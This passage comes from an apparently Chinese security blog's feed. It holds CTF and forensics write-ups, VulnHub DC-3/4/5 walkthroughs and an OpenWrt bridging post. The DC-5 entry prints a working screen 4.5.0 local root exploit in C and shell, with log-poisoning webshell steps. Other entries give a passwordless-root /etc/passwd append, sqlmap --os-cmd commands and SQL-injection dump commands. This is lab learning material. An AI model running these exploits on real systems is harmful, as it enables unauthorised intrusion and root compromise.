src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1656507233920-96f5d286-73db-44df-adf0-8dabadee487b.png" alt="img"></p><blockquote><p>使用sqlmap的-os-cmd远程执行命令，看到根目录有flag字样文件</p><p>sqlmap -u <a href="http://218.94.60.213:13198/table.php?id=1">http://218.94.60.213:13198/table.php?id=1</a> --os-cmd=“ls /”</p></blockquote><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1656507912473-95a1f3c3-29cc-4020-9ed2-c6b1d782801b.png" alt="img"></p><blockquote><p>最后继续使用远程命令查看得到flag</p><p>sqlmap -u <a href="http://218.94.60.213:13198/table.php?id=1">http://218.94.60.213:13198/table.php?id=1</a> --os-cmd=“cat /flag_asflkhasklfhaklshfkjlashfjkas”</p></blockquote><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1656507964485-4c6551f9-be4e-48c3-bc18-37a4f769352b.png" alt="img"></p><h1>happy</h1><ul><li>题目：</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1656578511408-899d4caa-da5f-4f4d-b926-301072c6807c.png" alt="img"></p><ul><li>解题代码：</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1660034476965-e38a5350-cba4-4601-b203-f106b0ffc8f4.png" alt="img"></p><h1>rsarsa</h1><ul><li>题目：</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1656578279183-f84801df-8c4f-4b41-9c7f-6d23eced6b56.png" alt="img"></p><ul><li>解题代码：</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1660034540344-f99ee9de-c416-4530-8855-8f30f950ea9f.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网安小学期 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>蓝帽杯</title>
      <link href="/posts/60912/"/>
      <url>/posts/60912/</url>
      
        <content type="html"><![CDATA[<h1>电子取证</h1><h2 id="手机取证-1">手机取证_1</h2><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1657333787235-615922f7-f20e-4611-9762-19a6dc674e8d.png" alt="img"></p><ul><li>下载附件解压后打开里面的工具利用搜索功能定位到图片，然后导出</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1657333839811-7c954423-6908-4979-9afe-4b6886187632.png" alt="img"></p><h2 id="电子取证-2">电子取证_2</h2><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1657333976087-655d313a-f4a1-4e5f-bcae-b3da06a36528.png" alt="img"></p><ul><li>同理，直接搜索关键词</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1657333991488-26ef1390-bef3-416c-9a0f-f0639d59812d.png" alt="img"></p><h2 id="程序分析-1">程序分析_1</h2><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1657335008694-dcc5a592-38b0-454e-a653-c1d2be7529f1.png" alt="img"></p><ul><li>下载附件得到一个apk文件，这个可以直接把apk改成zip然后进目录</li><li>经过百度得知，apk程序的包名都是在AndroidManifest.xml里面的，但是这个文件不能直接打开，直接打开全是乱码，需要工具来破解</li><li>利用AXMLPrinter2.jar工具把 AndroidManifest.xml破解成AndroidManifest.txt文件</li></ul><p>cmd下的命令：java -jar AXMLPrinter2.jar AndroidManifest.xml &gt; AndroidManifest.txt</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1657335302754-3221ccb6-1320-4feb-9b71-6b53fd92e56f.png" alt="img"></p><h2 id="程序分析-2">程序分析_2</h2><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1657336192084-9dfd8d51-d4dd-4c87-b500-e0d6ebf04d72.png" alt="img"></p><ul><li>这题利用aapt工具去获取入口，上一题的程序名称也可以利用这个工具</li></ul><p>powershell下的命令（cmd下的有略微不同）： .\aapt dump badging C:\Users\alpha\Desktop\蓝帽杯\EXEC.apk &gt; C:\Users\alpha\Desktop\蓝帽杯\info.txt</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1657336298593-4e00e3d4-d457-4775-93e1-cc991d985456.png" alt="img"></p><h2 id="程序分析-3">程序分析_3</h2><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1657361463768-f386c49b-b4ef-4d84-a850-8302b083f43c.png" alt="img"></p><p>1.利用dex2jar工具进行反编译</p><p>2.利用jd-gui工具查看反编译文件</p><p>3.逐个查看文件，发现一个经过base64加密的字符串，尝试提交成功</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1657361752137-c5344d31-fc91-4c05-b161-bc65dd73b969.png" alt="img"></p><h2 id="网站取证-1">网站取证_1</h2><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1657361831363-c1038060-88ca-4d43-9ada-916948e26b31.png" alt="img"></p><p>代码审计</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1657362601355-e8d8a22f-4de9-4830-a659-6d0bfc7925aa.png" alt="img"></p><h2 id="网站取证-2">网站取证_2</h2><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1657361934758-ade53464-05c4-46d4-bee6-cb79b08b7322.png" alt="img"></p><p>在database.php中的password中发现有一个my_encrypt()函数</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1657362442019-017ac9f8-18a0-438a-8ed5-ea6259e404e2.png" alt="img"></p><p>根据这个找到encrypt.php进行解密，当然代码还需要进行优化</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1657362474892-d0c101b9-f4b2-4853-ac1c-e7fe222531a2.png" alt="img"></p><p>得出密码是： KBLT123</p><h2 id="网站取证-3">网站取证_3</h2><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1657362397140-ca8c80a0-3583-435d-983b-f8792a9c06c5.png" alt="img"></p><p>在Channelorder.php中发现盐值</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1657362569837-3942f65c-0047-4d0e-986a-3a32100e66db.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-5复现</title>
      <link href="/posts/4952/"/>
      <url>/posts/4952/</url>
      
        <content type="html"><![CDATA[<h1>DC-5复现</h1><h1>描述</h1><blockquote><p>DC-5是另一个专门建造的易受攻击的实验室，旨在获得渗透测试领域的经验。</p><p>该计划是让DC-5将其提升一个档次，因此这对初学者来说可能不是很好，但对于具有中级或更好经验的人来说应该是可以的。时间会证明一切（反馈也会证明一切）。</p><p>据我所知，只有一个可利用的入口点可以进入（也没有SSH）。这个特定的入口点可能很难识别，但它就在那里。您需要寻找一些与众不同的东西（随着页面的刷新而改变的东西）。这有望提供某种关于漏洞可能涉及的内容的想法。</p><p>只是为了记录，不涉及phpmailer漏洞。:-)</p><p>此挑战的最终目标是获取根并读取唯一的标志。</p><p>Linux技能和熟悉Linux命令行是必须的，基本的渗透测试工具的一些经验也是如此。</p><p>对于初学者来说，Google可以提供很大的帮助，但是您可以随时在@DCAU7上发推文给我寻求帮助，以帮助您再次前进。但请注意：我不会给你答案，相反，我会给你一个关于如何前进的想法。</p><p>但是，如果您真的，真的卡住了，您可以观看这个视频，其中显示了第一步。</p></blockquote><h1>实战</h1><h2 id="信息收集">信息收集</h2><blockquote><p>确定目标靶机的IP</p><p>扫面网段并判断目标靶机的IP，最终确定IP：192.168.116.129，并发现该靶机开放了80、111端口</p></blockquote><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220921225731025.png" alt="image-20220921225731025"></p><ul><li>访问80端口</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220921225838699.png" alt="image-20220921225838699"></p><h2 id="目录扫描">目录扫描</h2><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220921230332927.png" alt="image-20220921230332927"></p><h2 id="寻找漏洞">寻找漏洞</h2><ul><li>访问footer.php，发现年份是一直在变化的</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220921230358781.png" alt="image-20220921230358781"></p><ul><li>然后又访问了thankyou.php，在这里发现该页面调用了footer.php</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220921230429298.png" alt="image-20220921230429298"></p><ul><li>应该是使用php的‘include()’ 函数来包含了 ‘footer.php’ 文件，这样直接导致了LFI漏洞，下面我们来测试一下漏洞是否真的存在和看一下是否会过滤包含进来的文件</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220921230459378.png" alt="image-20220921230459378"></p><ul><li>发现可以成功读取到 /etc/passwd文件，存在文件包含漏洞<ul><li>靶机服务扫描时发现靶机网站使用的是nginx服务器，通过百度nginx服务器的配置文件/etc/nginx/nginx.conf，将nginx的配置文件包含过来查看日志路径，经过仔细查看发现了nginx的日志路径</li></ul></li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220920191246277.png" alt="image-20220920191246277"></p><h2 id="漏洞利用">漏洞利用</h2><ul><li>于是我们尝试包含日志文件，然后我们可以看到，日志文件会记录我们传入的参数，所以我们可以把php一句话当参数传给日志文件，然后再次尝试包含日志文件，即可使用webshell管理工具，蚁剑连接即可获得shell</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220920200407600.png" alt="image-20220920200407600"></p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220920200444798.png" alt="image-20220920200444798"></p><ul><li>蚁剑连接</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220920200625503.png" alt="image-20220920200625503"></p><h2 id="反弹shell">反弹shell</h2><ul><li>进入虚拟终端反弹shell</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220920204425272.png" alt="image-20220920204425272"></p><ul><li>切换一下shell的外壳;</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/sh&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="提权">提权</h2><ul><li>这里用的是suid提权,先用下面命令查找哪些命令具有suid权限</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220921140010475.png" alt="image-20220921140010475"></p><blockquote><p>找到一个screen-4.5.0，</p><p>用searchsploit 查找相关漏洞脚本</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit screen 4.5.0 </span><br></pre></td></tr></table></figure><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220921140243318.png" alt="image-20220921140243318"></p><ul><li>找到文件位置</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220921141422922.png" alt="image-20220921141422922"></p><ul><li>查看文件</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220921141524801.png" alt="image-20220921141524801"></p><ul><li>保存并编译libhax.c和rootshell.c</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220921141717743.png" alt="image-20220921141717743"></p><ul><li><p>编译libhax.c</p></li><li><p>脚本</p></li></ul><blockquote><p>gcc -fPIC -shared -ldl -o <a href="http://libhax.so">libhax.so</a> libhax.c</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line"><span class="type">void</span> <span class="title function_">dropshell</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    chown(<span class="string">&quot;/tmp/rootshell&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    chmod(<span class="string">&quot;/tmp/rootshell&quot;</span>, <span class="number">04755</span>);</span><br><span class="line">    unlink(<span class="string">&quot;/etc/ld.so.preload&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] done!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>编译rootshell.c</li><li>脚本</li></ul><blockquote><p>gcc -o rootshell rootshell.c</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    seteuid(<span class="number">0</span>);</span><br><span class="line">    setegid(<span class="number">0</span>);</span><br><span class="line">    execvp(<span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><a href="http://xn--dc5-c88d63ahu32a72mgmyurblz3n.sh">将剩余代码保存为dc5.sh</a>，再用vim打开编辑</p><p>保存dc5.sh文件输入 <strong>:set ff=unix</strong> ，否则在执行脚本文件时后出错</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"># screenroot.sh</span><br><span class="line"># setuid screen v4.5.0 local root exploit</span><br><span class="line"># abuses ld.so.preload overwriting to get root.</span><br><span class="line"># bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html</span><br><span class="line"># HACK THE PLANET</span><br><span class="line"># ~ infodox (25/1/2017)</span><br><span class="line">echo &quot;~ gnu/screenroot ~&quot;</span><br><span class="line">echo &quot;[+] First, we create our shell and library...&quot;</span><br><span class="line">echo &quot;[+] Now we create our /etc/ld.so.preload file...&quot;</span><br><span class="line">cd /etc</span><br><span class="line">umask 000 # because</span><br><span class="line">screen -D -m -L ld.so.preload echo -ne  &quot;\x0a/tmp/libhax.so&quot; # newline needed</span><br><span class="line">echo &quot;[+] Triggering...&quot;</span><br><span class="line">screen -ls # screen itself is setuid, so...</span><br><span class="line">/tmp/rootshell    </span><br></pre></td></tr></table></figure><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220921215636375.png" alt="image-20220921215636375"></p><ul><li><a href="http://xn--libhax-947k.so">将libhax.so</a> 、rootshell 、dc5.sh三个文件通过蚁剑上传到靶机/tmp目录</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220921220755016.png" alt="image-20220921220755016"></p><ul><li>上传成功后，<a href="http://xn--dc5-m35fr68n.sh">执行dc5.sh</a></li></ul><blockquote><p>chomd +x <a href="http://dc5.sh">dc5.sh</a>//增加执行权限</p><p>./dc5.sh//执行文件</p></blockquote><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220921221625827.png" alt="image-20220921221625827"></p><ul><li>进到root文件夹读取文件</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220921221721259.png" alt="image-20220921221721259"></p>]]></content>
      
      
      <categories>
          
          <category> 靶场&amp;靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>openwrt无线桥接组网</title>
      <link href="/posts/3407/"/>
      <url>/posts/3407/</url>
      
        <content type="html"><![CDATA[<h1>两台路由器实现同网段组网</h1><h2 id="题外话">题外话</h2><blockquote><p>这件事前前后后断断续续弄了将近一个月的时间，弄得快要崩溃了，直到今天终于弄好了！！！！！</p></blockquote><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220619215211152.png" alt="image-20220619215211152"></p><ul><li>这是能目前我还留存的最早的路由器固件，前前后后可能换了有10个固件吧。</li></ul><h2 id="过程">过程</h2><h3 id="设备">设备</h3><ul><li><p>网件RAX20（主路由）</p></li><li><p>网件WNDR3800（二级路由）</p></li><li><p>电脑（若干）</p></li><li><p>手机（若干）</p></li><li><p>打印机</p></li><li><p>NAS</p></li><li><p>服务器（DELL R720）</p></li><li><p>虚拟机</p></li></ul><h3 id="需要实现的功能">需要实现的功能</h3><ul><li><p>连接主路由就可以访问二级路由下部署的服务器</p></li><li><p>二级路由能访问主路上的NAS</p></li><li><p>和主路由下的所有设备进行通信</p></li></ul><h3 id="最终的网络拓补图">最终的网络拓补图</h3><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220619230201556.png" alt="image-20220619230201556"></p><h3 id="方案">方案</h3><h4 id="方案一">方案一</h4><ul><li>直接用二级路由去连接校园网，然后利用远程控制软件进行连接控制，但是效果不是很好，受网速等因素影响很大，而且不能很快的去管理服务器。</li></ul><h4 id="方案二">方案二</h4><ul><li>为了实现上面的功能，我试过用二级路由连接主路由（此时的二级路由为路由模式）然后利用静态路由和修改防火墙的方式来实现，但是因为技术不到家，弄了很久也没有成功。</li><li>后面改成了无线桥接（成功运行）</li></ul><h5 id="无线桥接">无线桥接</h5><ul><li><p>首先是换了路由器的固件，在这一步上我折腾了很久，可能换了有快10个版本的固件，最后才找到一个可以完美运行的版本。</p></li><li><p>这一步弄得久的就是要安装luci-proto-relay这个插件</p></li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220619234852939.png" alt="image-20220619234852939"></p><ul><li>接下来就是根据步骤去进行配置<a href="https://bandwh.com/net/28.html#:~:text=openwrt%E9%80%9A,%E5%A4%87%E5%9C%A8%E5%90%8C%E4%B8%80%E7%BD%91%E6%AE%B5%E5%86%85%E3%80%82">openwrt通过中继桥设置同网段无线中继 </a></li><li>根据方法进行配置就OK，成功ping通</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/QQ%E5%9B%BE%E7%89%8720220619234333.png" alt="QQ图片20220619234333"></p><h2 id="结语">结语</h2><blockquote><p>过程真的消耗很久，而且在每次重置路由器刷固件时很崩溃，因为要想进到U-Boot模式实在是太难了，每次刷固件都耗费很久的时间，所幸还是坚持搞了下来，中间也因为考试等原因没能一直去进行部署，直到今天才算是告一段落。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 路由器组网 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 路由器组网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-4复现</title>
      <link href="/posts/54088/"/>
      <url>/posts/54088/</url>
      
        <content type="html"><![CDATA[<h1>DC-4复现</h1><h1>描述</h1><blockquote><p>DC-4 是另一个特意建造的易受攻击的实验室，旨在获得渗透测试领域的经验。</p><p>与之前的 DC 版本不同，这个版本主要是为初学者/中级者设计的。只有一个标志，但从技术上讲，有多个入口点，就像上次一样，没有线索。</p><p>必须具备 Linux 技能和熟悉 Linux 命令行，以及一些基本渗透测试工具的经验。</p><p>对于初学者来说，谷歌可以提供很大的帮助，但你可以随时在@DCAU7 上给我发推文，寻求帮助，让你重新开始。但请注意：我不会给你答案，相反，我会给你一个关于如何前进的想法。</p></blockquote><h1>开始</h1><h2 id="信息收集">信息收集</h2><ul><li>扫描C段找到目标ip</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220605150821243.png" alt="image-20220605150821243"></p><ul><li>发现目标机器只开放了80和22端口</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220605154759595.png" alt="image-20220605154759595"></p><h2 id="漏洞挖掘">漏洞挖掘</h2><ul><li>访问ip</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220605160550758.png" alt="image-20220605160550758"></p><ul><li>弄到burp里爆破，具体过程可以看我的pikachu题解里有，得到了账号密码</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220605160636082.png" alt="image-20220605160636082"></p><ul><li>登录后能看到有三个执行命令</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220605161848892.png" alt="image-20220605161848892"></p><ul><li>抓包后发现，执行的方式是直接发送执行的命令到后端进行执行</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220605161703586.png" alt=""></p><ul><li>那就先看看我们拥有什么权限</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220605162110179.png" alt="image-20220605162110179"></p><ul><li>那我们尝试进行反弹shell</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220605162334426.png" alt="image-20220605162334426"></p><h2 id="提权">提权</h2><ul><li>我们可以看到该靶机上有python，那我们就可以切换交互式shell</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220605162839358.png" alt="image-20220605162839358"></p><ul><li>在一番寻找中找到一份备份的密码本，那就拷贝一份</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220605163206942.png" alt="image-20220605163206942"></p><ul><li>利用hydra进行爆破</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220605164824364.png" alt="image-20220605164824364"></p><ul><li>登录后看到有一个mbox，查看得到以下内容，然而并没有什么用</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220605165441140.png" alt="image-20220605165441140"></p><ul><li>经过一番寻找，最终找到了一份jim得邮件，得到了charles的密码</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220605170043889.png" alt="image-20220605170043889"></p><ul><li>直接切换用户到chaeles</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220605170143176.png" alt="image-20220605170143176"></p><ul><li>查看可以使用的root权限命令</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220605170305539.png" alt="image-20220605170305539"></p><ul><li>根据提示可以利用teehee添加一个root权限的账号</li></ul><p><code>echo &quot;admin::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd</code></p><ul><li>提权成功</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220605170549411.png" alt="image-20220605170549411"></p><h2 id="获取flag">获取flag</h2><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220605170703049.png" alt="image-20220605170703049"></p>]]></content>
      
      
      <categories>
          
          <category> 靶场&amp;靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-3复现</title>
      <link href="/posts/4926/"/>
      <url>/posts/4926/</url>
      
        <content type="html"><![CDATA[<h1>DC-3复现</h1><h2 id="描述">描述</h2><blockquote><p>DC-3 是另一个特意建造的易受攻击的实验室，旨在获得渗透测试领域的经验。</p><p>与之前的 DC 版本一样，这个版本是为初学者设计的，虽然这一次，只有一个标志，一个入口点，根本没有任何线索。</p><p>必须具备 Linux 技能和熟悉 Linux 命令行，以及一些基本渗透测试工具的经验。</p><p>对于初学者来说，谷歌可以提供很大的帮助，但你可以随时在@DCAU7 上给我发推文，寻求帮助，让你重新开始。但请注意：我不会给你答案，相反，我会给你一个关于如何前进的想法。</p><p>对于那些有 CTF 和 Boot2Root 挑战经验的人来说，这可能不会花你很长时间（事实上，它可能会花费你不到 20 分钟的时间）。</p><p>如果是这种情况，并且如果您希望它更具挑战性，您可以随时重做挑战并探索其他获得根和获得旗帜的方法。</p></blockquote><h2 id="开始">开始</h2><h3 id="信息收集">信息收集</h3><ul><li>扫描C段看找到目标机器的ip</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220605024811027.png" alt="image-20220605024811027"></p><ul><li>然后看都开了哪些端口，扫到了80端口</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220605024905636.png" alt="image-20220605024905636"></p><ul><li>直接访问ip看到这个网站用的是joomla的框架，那我们可以尝试利用joomscan工具获取更加详细的信息</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220605025205577.png" alt="image-20220605025205577"></p><ul><li><p>因为kali并没有集成该工具，所以需要下载</p></li><li><p>安装命令<code>apt install joomscan</code></p></li><li><p>安装好之后利用工具查看版本等信息<code>joomscan -u http://192.168.207.142/</code></p></li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220605025824356.png" alt="image-20220605025824356"></p><ul><li>在报告中不仅仅看到了版本信息，还有后台的管理地址</li><li>再利用searchploit查找有关的漏洞</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220605030809920.png" alt="image-20220605030809920"></p><ul><li>再用命令查看txt文本<code>cat /usr/share/exploitdb/exploits/php/webapps/42033.txt</code></li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220605031036970.png" alt="image-20220605031036970"></p><ul><li>从中我们得知漏洞的利用方法</li></ul><h3 id="渗透开始">渗透开始</h3><h4 id="sqlmap">sqlmap</h4><ul><li>直接跑payload</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u &quot;http://192.168.20.142/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; <span class="comment">--risk=3 --level=5 --random-agent --dbs -p list[fullordering]</span></span><br></pre></td></tr></table></figure><ul><li>得到了5个数据库，直接查看joomladb数据库中的表</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220605032447411.png" alt="image-20220605032447411"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u &quot;http://192.168.207.142/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; <span class="comment">--risk=3 --level=5 --random-agent -D joomladb --tables -p list[fullordering]</span></span><br></pre></td></tr></table></figure><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220605032852389.png" alt="image-20220605032852389"></p><ul><li>查列名</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u &quot;http://192.168.207.142/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;  <span class="comment">--risk=3 --level=5 --random-agent -D joomladb  -T &quot;#__users&quot; --columns   -p list[fullordering]</span></span><br></pre></td></tr></table></figure><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220605040539515.png" alt="image-20220605040539515"></p><ul><li>查找字段信息</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u &quot;http://192.168.207.142/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;  <span class="comment">--risk=3 --level=5 --random-agent -D joomladb  -T &quot;#__users&quot; -C &quot;name,password,username&quot; --dump   -p list[fullordering]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220605040758091.png" alt="image-20220605040758091"></p><h4 id="john破解">john破解</h4><ul><li>得到密码：snoopy</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220605041557479.png" 